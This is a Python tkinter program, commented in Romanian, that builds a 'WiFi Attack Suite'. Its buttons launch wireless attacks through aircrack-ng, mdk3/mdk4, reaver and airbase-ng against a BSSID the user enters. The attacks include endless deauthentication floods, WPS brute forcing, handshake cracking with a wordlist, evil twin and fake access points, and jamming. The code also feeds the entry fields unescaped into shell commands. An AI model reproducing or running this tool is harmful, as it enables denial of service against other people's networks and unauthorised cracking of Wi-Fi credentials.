import os
import tkinter as tk
from tkinter import scrolledtext
from threading import Thread

# Variabilă pentru a opri deauth flood continuu
stop_flood = False

def execute_command(command):
    output_text.insert(tk.END, f"[EXEC] {command}\n")
    output_text.see(tk.END)

    def run():
        process = os.popen(command)
        result = process.read()
        process.close()
        output_text.insert(tk.END, result + "\n")
        output_text.see(tk.END)

    Thread(target=run).start()

def attack_deauth():
    execute_command(f"aireplay-ng --deauth 10 -a {bssid_entry.get()} {interface_entry.get()}")

def deauth_flood():
    execute_command(f"aireplay-ng --deauth 0 -a {bssid_entry.get()} {interface_entry.get()}")

def stop_deauth():
    global stop_flood
    stop_flood = True
    execute_command("killall aireplay-ng")

def continuous_deauth():
    global stop_flood
    stop_flood = False
    def flood():
        while not stop_flood:
            os.system(f"aireplay-ng --deauth 1000 -a {bssid_entry.get()} {interface_entry.get()}")
    Thread(target=flood, daemon=True).start()
    execute_command("[INFO] Continuous Deauth Flood started.")

def brute_force_wps():
    execute_command(f"bully -b {bssid_entry.get()} -c 1 -v")

def crack_handshake():
    execute_command(f"aircrack-ng -w rockyou.txt -b {bssid_entry.get()} handshake.cap")

def beacon_spam():
    execute_command(f"mdk3 {interface_entry.get()} b -c 1")

def authentication_flood():
    execute_command(f"mdk3 {interface_entry.get()} a -a {bssid_entry.get()}")

def probe_request_flood():
    execute_command(f"mdk3 {interface_entry.get()} p -f")

def disassociation_attack():
    execute_command(f"mdk3 {interface_entry.get()} d -c 1")

def fake_access_point():
    execute_command(f"airbase-ng -a {bssid_entry.get()} -e 'FakeAP' {interface_entry.get()}")

def arp_replay():
    execute_command(f"aireplay-ng --arpreplay -b {bssid_entry.get()} -h 00:11:22:33:44:55 {interface_entry.get()}")

def wpa_dos():
    execute_command(f"mdk4 {interface_entry.get()} w")

def fragmentation_attack():
    execute_command(f"aireplay-ng --fragment -b {bssid_entry.get()} {interface_entry.get()}")

def chopchop_attack():
    execute_command(f"aireplay-ng --chopchop -b {bssid_entry.get()} {interface_entry.get()}")

def caffe_latte_attack():
    execute_command(f"aireplay-ng --caffe-latte -b {bssid_entry.get()} {interface_entry.get()}")

def wps_pixi_attack():
    execute_command(f"reaver -i {interface_entry.get()} -b {bssid_entry.get()} -K 1")

def evil_twin_attack():
    execute_command(f"airbase-ng -a {bssid_entry.get()} -e 'Evil Twin' {interface_entry.get()}")

def packet_injection_test():
    execute_command(f"aireplay-ng --test {interface_entry.get()}")

def deauth_all():
    execute_command(f"mdk4 {interface_entry.get()} d")

def jammer_attack():
    execute_command(f"mdk4 {interface_entry.get()} m")

# Crearea interfeței grafice
root = tk.Tk()
root.title("WiFi Attack Suite")
root.geometry("900x600")
root.configure(bg="black")

# Câmp pentru BSSID și interfață
top_frame = tk.Frame(root, bg="black")
top_frame.pack(side=tk.TOP, fill=tk.X, padx=10, pady=10)

tk.Label(top_frame, text="BSSID:", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
bssid_entry = tk.Entry(top_frame, bg="black", fg="white", insertbackground="white")
bssid_entry.pack(side=tk.LEFT, padx=5)

tk.Label(top_frame, text="Interfață:", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
interface_entry = tk.Entry(top_frame, bg="black", fg="white", insertbackground="white")
interface_entry.pack(side=tk.LEFT, padx=5)

# Zonă pentru afișarea comenzilor și rezultatelor
output_text = scrolledtext.ScrolledText(root, bg="black", fg="white", height=10)
output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

# Configurăm un layout corect pentru butoane folosind grid
bottom_frame = tk.Frame(root, bg="black")
bottom_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=10)

tk.Label(bottom_frame, text="BSSID pentru atac:", bg="black", fg="white").grid(row=0, column=0, padx=5, pady=5)
bssid_entry = tk.Entry(bottom_frame, bg="black", fg="white", insertbackground="white")
bssid_entry.grid(row=0, column=1, padx=5, pady=5)

# Container pentru butoane
button_frame = tk.Frame(bottom_frame, bg="black")
button_frame.grid(row=1, column=0, columnspan=2, pady=10)

# Butoane
buttons = [
    ("Deauth 10 Packets", attack_deauth),
    ("Deauth Flood", deauth_flood),
    ("Continuous Deauth Flood", continuous_deauth),
    ("Oprește Deauth", stop_deauth),
    ("Brute Force WPS", brute_force_wps),
    ("Sparge Handshake", crack_handshake),
    ("Beacon Spam", beacon_spam),
    ("Auth Flood", authentication_flood),
    ("Probe Flood", probe_request_flood),
    ("Disassociation Attack", disassociation_attack),
    ("Fake AP", fake_access_point),
    ("ARP Replay", arp_replay),
    ("WPA DoS", wpa_dos),
    ("Fragmentation Attack", fragmentation_attack),
    ("Chopchop Attack", chopchop_attack),
    ("Caffe Latte", caffe_latte_attack),
    ("WPS Pixie Attack", wps_pixi_attack),
    ("Evil Twin Attack", evil_twin_attack),
    ("Packet Injection Test", packet_injection_test),
    ("Deauth All", deauth_all),
    ("Jammer Attack", jammer_attack),
]

# Utilizăm grid pentru a organiza butoanele într-o rețea (4 rânduri × 5 coloane)
for i, (text, cmd) in enumerate(buttons):
    tk.Button(button_frame, text=text, command=cmd, bg="black", fg="white", width=18).grid(row=i // 5, column=i % 5, padx=5, pady=5)

root.mainloop()
